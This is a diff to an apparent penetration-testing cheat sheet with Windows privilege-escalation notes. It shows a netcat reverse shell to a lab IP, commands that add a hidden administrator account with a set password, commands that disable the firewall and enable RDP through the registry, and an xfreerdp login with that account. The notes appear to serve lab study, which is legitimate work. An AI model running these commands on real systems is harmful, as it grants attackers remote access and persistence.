@@ -127,7 +127,7 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 > 1. Get reverse shell --- nc.exe 192.168.49.202 4443 -e cmd
 
 
-#### PrivESC Methodology for Windows
+##### PrivESC Methodology for Windows
 > 1. Run commands such as -> whoami --- whoami /priv [to see the privileges]
 > 1. Exploits can be: Kernel, Service
 > 1. Run winpeas with fast, searchfast or cmd options.
@@ -138,6 +138,19 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 > 1. specific user details - net user <username>
 > 1. FW status - netsh firewall show state
 
-#### Windows add an Admin user from CMD
+##### Windows add an Admin user from CMD
 > 1. net user /add [username] [password] ---> net user /add superadmin Superadmin123$
 > 1. net localgroup administrators [username] /add ---> net localgroup administrators superadmin
+
+
+##### Windows Firewall from CMD
+> 1. FW on --- netsh advfirewall set currentprofile state on
+> 1. FW off --- netsh advfirewall set currentprofile state off
+
+##### Windows RDP from CMD
+> 1. enable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+> 1. disable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+
+
+##### Access Windows box via xfreerdp
+> 1. xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389
